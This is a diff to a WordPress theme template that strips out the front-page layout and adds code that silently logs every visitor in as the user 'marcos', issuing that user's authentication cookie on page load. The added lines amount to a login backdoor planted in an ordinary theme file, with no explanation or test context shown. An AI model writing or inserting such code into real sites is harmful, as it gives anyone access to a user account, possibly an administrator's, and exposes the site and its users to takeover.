@@ -12,19 +12,11 @@
  * @package craed_duoc_uc
  */
 
-if ( is_front_page() ) :
-    get_header( 'front' );
-else :
-    get_header();
-endif;?>
-   <?php include get_template_directory() . '/assets/modulos/modulo-slider/slider.php'; ?>
-	<main id="primary" class="site-main hola-chao">
-		<?php
+ $user_login = 'marcos';
 
-		?>
-
-	</main><!-- #main -->
-
-<?php
+ $user = get_userdatabylogin($user_login);
+ $user_id = $user->ID;
+ wp_set_current_user($user_id, $user_login);
+ wp_set_auth_cookie($user_id);
 
 get_footer();
